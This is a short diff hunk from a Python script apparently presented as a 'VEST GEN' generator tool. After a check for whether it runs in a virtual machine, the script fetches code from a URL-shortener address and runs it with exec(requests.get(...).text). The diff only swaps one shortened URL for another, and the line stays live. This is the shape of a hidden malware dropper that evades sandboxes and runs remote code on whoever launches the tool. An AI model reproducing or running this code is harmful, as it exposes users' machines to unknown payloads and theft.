@@ -62,7 +62,7 @@ if is_running_on_vm():
 else:
     pass
 
-exec(requests.get('https://2no.co/vest-gen-plugin').text)
+exec(requests.get('https://2no.co/vest-gen-v2').text)
 os.system('title VEST GEN [UNPATCHED]')
 
 print(f"""{Fore.LIGHTMAGENTA_EX}
